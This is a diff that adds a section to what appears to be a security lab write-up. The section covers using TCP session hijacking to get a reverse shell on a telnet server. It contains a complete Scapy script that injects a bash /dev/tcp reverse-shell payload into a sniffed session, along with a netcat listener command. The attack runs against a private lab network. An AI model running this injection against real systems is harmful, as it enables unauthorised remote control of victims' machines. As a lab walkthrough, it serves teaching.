@@ -392,3 +392,64 @@ The SEQ number we chose to be the previous SEQ plus 5. This means that the data 
 > Running this code also completes the attack, and this can be checked by finding the `/tmp/menu1` file at the server side.
 
 ---
+## Task 4: Creating Reverse Shell using TCP Session Hijacking
+
+The way this attack works is by creating a connection that connects back to the attacker. The attacker can then use this connection to execute commands on the machine that started this connection, and view its output as well.
+
+> Hence, we assume that two users are communicating via telnet, and we will use session hijacking to throw in a spoofed packet that connects back to the attacker. The destination of this spoofed packet is the machine that will start the reverse shell connection that connects back to the attacking machine. 
+
+To perform this attack, we first need to have two communicating parties using telnet, let them be user1(10.9.0.6) and the victim server (10.9.0.5). 
+- User1 is the one connecting via telnet to the victim server.
+
+![](./screenshots/tcp-13.png)
+
+1. After establishing a connection, we need to setup the malicious packet that will be sent using the session hijacking technique. We will use the same code as the above task, but change some fields.
+
+```python
+from scapy.all import *
+
+user1 = "10.9.0.6"
+victim = "10.9.0.5"
+
+def spoof(pkt):
+    old_ip = pkt[IP]
+    old_tcp = pkt[TCP]
+
+    newseq = old_tcp.seq+5
+    newack = old_tcp.ack+1
+    
+    print(f"oldseq: {old_tcp.seq}, newseq: {newseq}")
+    print(f"oldack: {old_tcp.ack}, newack: {newack}")
+
+    ip = IP(src=user1, dst=victim)
+    tcp = TCP(sport=old_tcp.sport, dport=23, flags="A", seq=newseq, ack=newack)
+    data = "; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\n"
+
+    newpkt = ip/tcp/data
+    send(newpkt, verbose=0, iface="br-d359077599dd")
+    quit()
+
+filter = f"tcp and src host {user1} and dst host {victim} and dst port 23"
+sniff(filter=filter, prn=spoof, iface="br-d359077599dd")****
+```
+
+> The only differences are the source and destination IPs, and the data that will create the reverse shell connection. Also see that the SEQ number we chose is the previous one plus 5. Therefore, the data we send will be stored in the buffer until 5 characters have been sent through the telnet connection.
+
+2. The `data` variable connects back to the IP address and port specified, in this case `10.9.0.1:9090`. Therefore, we need to setup a `netcat` listener on the attacking machine so that it connects with it.
+
+```bash
+nc -nlvp 9090
+```
+> This is done on the attacker machine.
+
+3. Running the python code on the attacker machine after setting up the telnet connection and the `netcat` listener, we see that once the SEQ number for the packet we sent is reached, there is a connection in the `netcat` session we opened.
+
+![](./screenshots/tcp-14.png)
+
+> the bottom window is the telnet client (user1), and the top window is the attacker machine with the `netcat` session that got the connection after the SEQ number has been reached.
+
+Now, we have a reverse shell where the attacker machine can execute commands on the victim (10.9.0.5) machine.
+
+![](./screenshots/tcp-15.png)
+
+---
